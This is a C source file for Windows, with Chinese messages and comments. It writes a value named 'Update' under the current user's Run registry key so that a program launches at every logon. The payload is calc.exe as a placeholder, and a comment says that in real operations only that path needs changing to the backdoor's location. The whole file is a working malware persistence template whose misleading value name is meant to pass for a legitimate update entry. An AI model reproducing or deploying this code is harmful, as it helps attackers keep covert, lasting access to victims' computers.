#include <stdio.h>
#include <windows.h>

int main() {
	HKEY hKey;
	HKEY hKey1 = HKEY_CURRENT_USER;
	char lpSubKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
	DWORD samDesired = KEY_ALL_ACCESS;
	DWORD lpdwDisposition = REG_OPENED_EXISTING_KEY;
	long result1 = RegCreateKeyEx(hKey1, lpSubKey, 0, NULL, dwOptions, samDesired, NULL, &hKey, &lpdwDisposition);
	if (result1 != ERROR_SUCCESS) {
		printf("创建失败");
		return EXIT_FAILURE;
	}
	
	char filename[] = "C:\\Windows\\System32\\calc.exe";			//实战中使用的时候只需修改这里为后门所在路径
	char lpValueName[] = "Update";
	long result2 = RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (const BYTE*)filename, strlen(filename));
	if (result2 != ERROR_SUCCESS) {
		printf("设置键值失败");
		return EXIT_FAILURE;
	}
	printf("成功写入注册表!\n");
	RegCloseKey(hKey);
	system("pause");
	return 0;
}


